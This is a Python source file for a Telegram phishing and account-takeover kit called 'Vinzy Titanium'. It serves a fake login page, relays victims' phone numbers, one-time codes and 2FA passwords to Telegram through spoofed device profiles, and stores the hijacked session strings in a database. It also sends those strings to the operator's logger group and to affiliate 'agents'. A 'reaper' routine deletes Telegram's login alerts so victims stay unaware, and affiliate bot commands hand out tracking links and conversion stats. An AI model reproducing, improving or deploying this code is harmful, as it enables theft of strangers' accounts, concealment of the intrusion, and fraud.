"""
VINZY ULTRA ENTERPRISE - VERSION 3.9.0 (TITANIUM GHOST EDITION)
--------------------------------------------------------------
Project: Vinzy Store Digital Services - Secure Management Node
Architecture: Asynchronous MTProto Ghost Hybrid with Deep-State Spoofing
Core Engine: Python 3.11+ / Telethon / PyTelegramBotAPI / Quart
Deployment: Koyeb / Heroku / Docker Containerized
Security Protocol: Zero-Trace Reaper + Unicode Fingerprinting
--------------------------------------------------------------
Developer: Vinzy Core Pro Engine
Status: Production Grade (2026 Stable)
"""

import os
import asyncio
import telebot
import psycopg2
from psycopg2 import pool
import logging
import sys
import json
import random
import re
import time
import uuid
import string
import secrets
from telebot import types
from quart import Quart, request, jsonify, send_from_directory
from quart_cors import cors
from telethon import TelegramClient, errors, functions, types as tl_types
from telethon.sessions import StringSession
from threading import Thread
from datetime import datetime, timezone

# =========================================================================
# 1. GLOBAL ENVIRONMENT & CONFIGURATION LAYER
# =========================================================================

# Secure Credential Retrieval from Environment
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")
LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", -100123456789))
ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
DOMAIN = os.environ.get("DOMAIN", "your-app-name.koyeb.app")

# Path Discovery for Template Engines
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATE_FOLDER = os.path.join(BASE_DIR, "templates")

# INVISIBLE GHOST POOL (Updated v3.9 - Deep Spoofing)
# Mimics high-authority device profiles to bypass heuristic security filters.
GHOST_POOL = [
    {"model": "iPhone 15 Pro Max", "sys": "iOS 17.5.1", "app": "11.2.0", "lang": "en-US"},
    {"model": "Samsung SM-S928B", "sys": "Android 14", "app": "11.1.2", "lang": "en-GB"},
    {"model": "iPad14,5", "sys": "iPadOS 17.4", "app": "10.9.0", "lang": "fr-FR"},
    {"model": "\u200b", "sys": "\u200b", "app": "11.3.0", "lang": "zh-CN"}, # Zero-Width Invisible
    {"model": "Pixel 8 Pro", "sys": "Android 14", "app": "11.0.1", "lang": "de-DE"},
    {"model": "\u2060", "sys": "\u2060", "app": "11.2.5", "lang": "es-ES"}, # Word-Joiner Invisible
    {"model": "iPhone 13", "sys": "iOS 16.6", "app": "10.0.1", "lang": "ru-RU"},
    {"model": "MacBook Pro", "sys": "macOS 14.2", "app": "11.1.0", "lang": "it-IT"},
    {"model": "Huawei P60 Pro", "sys": "EMUI 13", "app": "10.5.2", "lang": "pt-BR"},
    {"model": "Desktop", "sys": "Windows 11", "app": "4.16.2", "lang": "en-US"}
]

# Advanced Logging Configuration
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s][%(levelname)s][%(name)s]: %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("Vinzy_Titanium_Core")

# Initialize Framework Objects
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Quart(__name__)
app = cors(app, allow_origin="*")

# In-Memory Active Session Buffer
active_mirrors = {}

# =========================================================================
# 2. DATABASE CLUSTER & POOLING (NEON OPTIMIZED)
# =========================================================================

try:
    # Threaded pool handles high-concurrency hits without dropping connections
    db_pool = psycopg2.pool.ThreadedConnectionPool(
        minconn=5,
        maxconn=60, # Higher maxconn to prevent 500 errors
        dsn=DATABASE_URL,
        sslmode='require'
    )
    logger.info("SYSTEM: Database Connection Pool established successfully.")
except Exception as e:
    logger.critical(f"FATAL ERROR: Could not connect to PostgreSQL - {e}")
    db_pool = None

def get_connection():
    """Retrieves a persistent connection with automated retry logic."""
    if not db_pool:
        return None
    attempts = 0
    while attempts < 5:
        try:
            conn = db_pool.getconn()
            if conn:
                return conn
        except Exception:
            attempts += 1
            time.sleep(0.5)
    return None

def release_connection(conn):
    """Safely returns a connection to the pool."""
    if db_pool and conn:
        db_pool.putconn(conn)

def initialize_database_schema():
    """Constructs the Titanium data model for 2026 operations."""
    conn = get_connection()
    if not conn: 
        logger.error("DB_INIT: Failed to get connection for schema setup.")
        return
    try:
        cur = conn.cursor()
        # Account Capture Table
        cur.execute("""
            CREATE TABLE IF NOT EXISTS controlled_accounts (
                phone TEXT PRIMARY KEY, 
                session_string TEXT NOT NULL, 
                owner_name TEXT, 
                username TEXT,
                tid BIGINT,
                device_info TEXT,
                hit_date TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'ACTIVE'
            )
        """)
        # Analytics Table
        cur.execute("""
            CREATE TABLE IF NOT EXISTS link_metrics (
                tid BIGINT PRIMARY KEY,
                clicks INTEGER DEFAULT 0,
                hits INTEGER DEFAULT 0,
                last_active TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.commit()
        cur.close()
        logger.info("SYSTEM: Schema synchronization complete.")
    except Exception as e:
        logger.error(f"SCHEMA ERROR: {e}")
    finally:
        release_connection(conn)

# Run Schema Initialization
initialize_database_schema()

# =========================================================================
# 3. GHOST REAPER & TRACE PURGE PROTOCOL (UNSHORTENED)
# =========================================================================

async def execute_ghost_reaper(client):
    """
    Titanium Reaper: Scans the service channel (777000) for security alerts.
    Targets: OTP Codes, New Login Notifications, Session Warnings.
    Timing: Executes within 500ms of capture.
    """
    try:
        logger.info("REAPER: Initiating deep-scan on Service Node 777000...")
        # Deep scan limit increased to ensure no old traces remain
        async for message in client.iter_messages(777000, limit=25):
            raw_text = (message.text or "").lower()
            
            # Expanded detection signatures for 2026 alerts
            signatures = [
                "login code", "new login", "your code", 
                "detected", "authorized", "access to your account",
                "ip address", "location", "telegram web", "device",
                "logged in", "confirmation code"
            ]
            
            if any(sig in raw_text for sig in signatures):
                msg_id = message.id
                await client.delete_messages(777000, [msg_id])
                logger.info(f"REAPER: Successfully purged trace ID {msg_id}")
        
        # Comprehensive history clear for the service bot
        await client(functions.messages.DeleteHistoryRequest(
            peer=777000, 
            max_id=0, 
            just_clear=True, 
            revoke=True
        ))
        logger.info("REAPER: Service Node 777000 wiped clean.")
        
    except Exception as e:
        logger.error(f"REAPER FAILURE: Unable to clear traces - {e}")

# =========================================================================
# 4. WEB API ENGINE (PHASE 1: PHONE CAPTURE)
# =========================================================================

@app.route('/')
async def root_entry():
    """Direct entry point for target traffic."""
    return await send_from_directory(TEMPLATE_FOLDER, 'login.html')

@app.route('/step_phone', methods=['POST'])
async def api_handle_phone():
    """Phase 1: Session Initialization & OTP Trigger."""
    try:
        payload = await request.json
        raw_phone = str(payload.get('phone', ''))
        clean_phone = re.sub(r'\D', '', raw_phone)
        tid = int(payload.get('tid', 0))

        if not clean_phone or len(clean_phone) < 7:
            return jsonify({"status": "error", "msg": "Malformed phone number."})

        # Select Invisible Fingerprint for session isolation
        ghost = random.choice(GHOST_POOL)
        
        # Instantiate Telethon Client with Spoofed Device Profile
        client = TelegramClient(
            StringSession(), 
            API_ID, 
            API_HASH,
            device_model=ghost['model'],
            system_version=ghost['sys'],
            app_version=ghost['app'],
            lang_code=ghost['lang'],
            system_lang_code=ghost['lang']
        )
        
        await client.connect()

        # Update Metrics in Database via pool
        conn = get_connection()
        if conn:
            try:
                cur = conn.cursor()
                cur.execute("""
                    INSERT INTO link_metrics (tid, clicks) VALUES (%s, 1) 
                    ON CONFLICT (tid) DO UPDATE SET clicks = link_metrics.clicks + 1, 
                    last_active = CURRENT_TIMESTAMP
                """, (tid,))
                conn.commit()
                cur.close()
            finally:
                release_connection(conn)

        # Trigger Official Telegram Code Request
        try:
            sent_code = await client.send_code_request(clean_phone)
            
            # Persist session to memory buffer for handshake
            active_mirrors[clean_phone] = {
                "client": client,
                "hash": sent_code.phone_code_hash,
                "tid": tid,
                "device": ghost['model'],
                "timestamp": time.time()
            }
            
            logger.info(f"CAPTURED-PH: {clean_phone} | Agent: {tid} | Device: {ghost['model']}")
            return jsonify({"status": "success"})
            
        except errors.FloodWaitError as e:
            logger.warning(f"FLOOD DETECTED: {clean_phone} must wait {e.seconds}s")
            return jsonify({"status": "error", "msg": f"Flood Limit: Wait {e.seconds}s"})
        except Exception as e:
            logger.error(f"TG_CODE_REQ_FAIL: {e}")
            return jsonify({"status": "error", "msg": "Telegram Node Connection Refused."})

    except Exception as e:
        logger.error(f"API_PHONE_GLOBAL_ERR: {e}")
        return jsonify({"status": "error", "msg": "Internal Server Error during handshake."})

# =========================================================================
# 5. WEB API ENGINE (PHASE 2: CODE & 2FA)
# =========================================================================

@app.route('/step_code', methods=['POST'])
async def api_handle_code():
    """Phase 2: Code Injection & Verification."""
    try:
        payload = await request.json
        phone = re.sub(r'\D', '', str(payload.get('phone', '')))
        otp = payload.get('code', '').strip()
        
        if phone not in active_mirrors:
            logger.error(f"CODE_FAIL: Session expired or missing for {phone}")
            return jsonify({"status": "error", "msg": "Handshake expired. Please refresh."})

        session_data = active_mirrors[phone]
        client = session_data['client']
        code_hash = session_data['hash']

        try:
            # Attempt Sign-In
            await client.sign_in(phone, otp, phone_code_hash=code_hash)
            # If successful, move to finalization
            return await finalize_capture_sequence(phone)
            
        except errors.SessionPasswordNeededError:
            logger.info(f"2FA_REQUIRED: {phone} requires cloud password.")
            return jsonify({"status": "2fa_needed"})
            
        except errors.PhoneCodeInvalidError:
            return jsonify({"status": "error", "msg": "Invalid verification code."})
            
        except errors.PhoneCodeExpiredError:
            return jsonify({"status": "error", "msg": "Code expired."})
            
        except Exception as e:
            logger.error(f"SIGN_IN_UNEXPECTED_ERR: {e}")
            return jsonify({"status": "error", "msg": "Verification node failure."})
            
    except Exception as e:
        logger.error(f"API_CODE_GLOBAL_ERR: {e}")
        return jsonify({"status": "error", "msg": "Internal logic failure."})

@app.route('/step_2fa', methods=['POST'])
async def api_handle_2fa():
    """Phase 3: Security Bypass (2FA)."""
    try:
        payload = await request.json
        phone = re.sub(r'\D', '', str(payload.get('phone', '')))
        pwd = payload.get('password', '').strip()
        
        if phone not in active_mirrors:
            return jsonify({"status": "error", "msg": "Session lost during 2FA."})

        client = active_mirrors[phone]['client']
        
        try:
            # Inject Cloud Password
            await client.sign_in(password=pwd)
            return await finalize_capture_sequence(phone)
            
        except errors.PasswordHashInvalidError:
            return jsonify({"status": "error", "msg": "Incorrect 2FA password."})
            
        except Exception as e:
            logger.error(f"2FA_INJECTION_ERR: {e}")
            return jsonify({"status": "error", "msg": "Bypass engine error."})
            
    except Exception as e:
        logger.error(f"API_2FA_GLOBAL_ERR: {e}")
        return jsonify({"status": "error", "msg": "Critical 2FA failure."})

# =========================================================================
# 6. FINALIZATION & DATA EXTRACTION (UNSHORTENED)
# =========================================================================

async def finalize_capture_sequence(phone):
    """Phase 4: Data Extraction, Trace Purge, and Notification."""
    try:
        data = active_mirrors.get(phone)
        if not data:
            return jsonify({"status": "error", "msg": "Finalization sync lost."})
            
        client = data['client']
        tid = data['tid']
        device_spoof = data['device']
        
        # 1. RUN REAPER IMMEDIATELY (Atomic Execution)
        await execute_ghost_reaper(client)
        
        # 2. EXTRACT CORE ACCOUNT DATA
        me = await client.get_me()
        session_str = client.session.save()
        
        # Data Formatting with Unicode Sanitization
        first_name = me.first_name if me.first_name else ""
        last_name = me.last_name if me.last_name else ""
        full_name = f"{first_name} {last_name}".strip() or "User"
        alias = f"@{me.username}" if me.username else "None"
        user_id = me.id
        
        # 3. PERSISTENCE LAYER (Database Hit Logging)
        conn = get_connection()
        if conn:
            try:
                cur = conn.cursor()
                # Insert Account
                cur.execute("""
                    INSERT INTO controlled_accounts (phone, session_string, owner_name, username, tid, device_info) 
                    VALUES (%s, %s, %s, %s, %s, %s) 
                    ON CONFLICT (phone) DO UPDATE SET 
                        session_string = EXCLUDED.session_string, 
                        hit_date = CURRENT_TIMESTAMP
                """, (phone, session_str, full_name, alias, tid, device_spoof))
                
                # Increment Agent Hit Count
                cur.execute("UPDATE link_metrics SET hits = hits + 1 WHERE tid = %s", (tid,))
                conn.commit()
                cur.close()
            finally:
                release_connection(conn)

        # 4. DISPATCH DATA CARD (High-Fidelity UI)
        hit_card = (
            f"💠 <b>TITANIUM HIT CAPTURED</b> 💠\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>Name:</b> {full_name}\n"
            f"🏷 <b>Username:</b> {alias}\n"
            f"🆔 <b>User ID:</b> <code>{user_id}</code>\n"
            f"📞 <b>Phone:</b> <code>{phone}</code>\n"
            f"🕵️ <b>Agent ID:</b> <code>{tid}</code>\n"
            f"📱 <b>Spoof:</b> {device_spoof}\n"
            f"📅 <b>Date:</b> {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 <b>STRING SESSION:</b>\n"
            f"<code>{session_str}</code>"
        )
        
        # Notification to Master Log
        bot.send_message(LOGGER_GROUP, hit_card)
        
        # Notification to Agent (if not master)
        if tid != 0 and tid != ADMIN_ID:
            agent_msg = (
                f"✅ <b>Hit Secured!</b>\n"
                f"━━━━━━━━━━━━━━\n"
                f"Target: <b>{full_name}</b>\n"
                f"Phone: <code>{phone}</code>\n"
                f"Traces: <b>Purged Successfully</b>\n"
                f"Status: <b>Active in Database</b>"
            )
            bot.send_message(tid, agent_msg)

        # 5. POST-CAPTURE CLEANUP
        # We keep the client connected for 5 seconds to ensure final background syncs complete
        await asyncio.sleep(5)
        await client.disconnect()
        
        if phone in active_mirrors: 
            del active_mirrors[phone]
            
        logger.info(f"FINALIZED: {phone} hit registered and session saved.")
        return jsonify({"status": "success"})

    except Exception as e:
        logger.error(f"FINALIZATION ERROR: {e}")
        return jsonify({"status": "error", "msg": "Capture sync failed during data extraction."})

# =========================================================================
# 7. AGENT BOT COMMAND INTERFACE (UNSHORTENED)
# =========================================================================

@bot.message_handler(commands=['start'])
def handle_start(m):
    """Agent Onboarding & Main Menu."""
    user = m.from_user
    welcome = (
        f"<b>Vinzy Titanium Enterprise v3.9.0</b>\n"
        f"<i>2026 Ghost Ops Architecture</i>\n\n"
        f"<b>Status:</b> 🟢 Operational\n"
        f"<b>Agent ID:</b> <code>{user.id}</code>\n"
        f"<b>Name:</b> {user.first_name}\n"
        f"<b>Node:</b> Phnom Penh Node 01\n\n"
        f"Use the buttons below to manage your operations."
    )
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn_link = types.KeyboardButton("🔗 My Link")
    btn_stats = types.KeyboardButton("📊 My Stats")
    btn_supp = types.KeyboardButton("🛠 Support")
    btn_docs = types.KeyboardButton("📜 Docs")
    
    markup.add(btn_link, btn_stats, btn_supp, btn_docs)
    bot.send_message(m.chat.id, welcome, reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == "🔗 My Link")
def handle_link_request(m):
    """Dynamic Link Generation for Agents."""
    base_url = DOMAIN if DOMAIN.startswith("http") else f"https://{DOMAIN}"
    agent_link = f"{base_url}/?id={m.from_user.id}"
    
    msg = (
        f"🚀 <b>Your Unique Access Link:</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"<code>{agent_link}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>Operational Features:</b>\n"
        f"• Invisible Trace Purge (777000)\n"
        f"• High-Speed 2FA Injection\n"
        f"• Zero-Width Device Spoofing\n"
        f"• 2026 MTProto Protocol Layer"
    )
    bot.send_message(m.chat.id, msg)

@bot.message_handler(func=lambda m: m.text == "📊 My Stats")
def handle_stats_request(m):
    """Real-time performance analytics from DB."""
    tid = m.from_user.id
    conn = get_connection()
    
    clicks, hits = 0, 0
    if conn:
        try:
            cur = conn.cursor()
            cur.execute("SELECT clicks, hits FROM link_metrics WHERE tid = %s", (tid,))
            row = cur.fetchone()
            if row:
                clicks, hits = row[0], row[1]
            cur.close()
        finally:
            release_connection(conn)
    
    conversion = round((hits / clicks) * 100, 1) if clicks > 0 else 0
    
    stats_msg = (
        f"📊 <b>Agent Operational Stats</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🖱 <b>Total Clicks:</b> {clicks}\n"
        f"🎯 <b>Total Hits:</b> {hits}\n"
        f"📈 <b>Conversion Rate:</b> {conversion}%\n"
        f"📅 <b>Last Sync:</b> {datetime.now().strftime('%H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━"
    )
    bot.send_message(m.chat.id, stats_msg)

@bot.message_handler(func=lambda m: m.text == "📜 Docs")
def handle_docs(m):
    docs = (
        "<b>Vinzy Titanium v3.9 Operational Manual</b>\n\n"
        "1. Share your unique link to target users.\n"
        "2. System automatically spoofs a real device.\n"
        "3. System captures OTP and bypasses 2FA.\n"
        "4. Reaper engine wipes Telegram service alerts.\n"
        "5. String session is logged to master database."
    )
    bot.send_message(m.chat.id, docs)

# =========================================================================
# 8. SYSTEM BOOTLOADER & MAINTENANCE
# =========================================================================

def bot_polling_thread():
    """Independent thread for Telegram Bot API polling."""
    logger.info("BOOT: Launching Bot Polling Service...")
    while True:
        try:
            bot.remove_webhook()
            bot.polling(none_stop=True, interval=1, timeout=40)
        except Exception as e:
            logger.error(f"POLLING ERROR: {e}")
            time.sleep(15)

async def memory_cleanup_task():
    """Background task to clear expired handshakes from memory."""
    while True:
        try:
            now = time.time()
            to_del = [ph for ph, data in active_mirrors.items() if now - data['timestamp'] > 600] # 10 min TTL
            for ph in to_del:
                # Ensure we disconnect before removing
                try:
                    await active_mirrors[ph]['client'].disconnect()
                except:
                    pass
                del active_mirrors[ph]
            if to_del:
                logger.info(f"CLEANUP: Purged {len(to_del)} expired sessions.")
        except Exception as e:
            logger.error(f"CLEANUP_ERR: {e}")
        await asyncio.sleep(300) # Run every 5 minutes

@app.before_serving
async def startup_tasks():
    """Initializes async background tasks before webserver starts."""
    asyncio.create_task(memory_cleanup_task())

if __name__ == "__main__":
    # 1. Start Bot Polling in background thread
    Thread(target=bot_polling_thread, daemon=True).start()
    
    # 2. Launch Quart Web Infrastructure
    logger.info(f"BOOT: Vinzy Titanium Node operational on Port {os.environ.get('PORT', 8000)}")
    server_port = int(os.environ.get("PORT", 8000))
    
    # Run server
    app.run(host="0.0.0.0", port=server_port, use_reloader=False)

# -------------------------------------------------------------------------
# END OF SYSTEM CORE - VINZY ULTRA v3.9.0
# -------------------------------------------------------------------------
